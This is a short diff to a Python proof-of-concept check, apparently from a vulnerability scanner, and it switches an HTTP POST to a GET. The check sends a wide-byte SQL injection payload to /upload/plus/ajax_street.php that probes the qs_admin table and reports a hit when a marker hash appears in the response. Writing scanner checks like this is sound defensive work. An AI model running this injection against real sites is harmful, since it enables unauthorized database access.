@@ -51,7 +51,7 @@ class Poc(ABPoc):
 
             payload = "/upload/plus/ajax_street.php?act=key&key=s%e9%8c%a6' or cast(ascii(substring((select md5(c) from qs_admin),1,1))=97 as signed) %23"
             url = self.target + payload
-            r = requests.post(url)
+            r = requests.get(url)
 
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
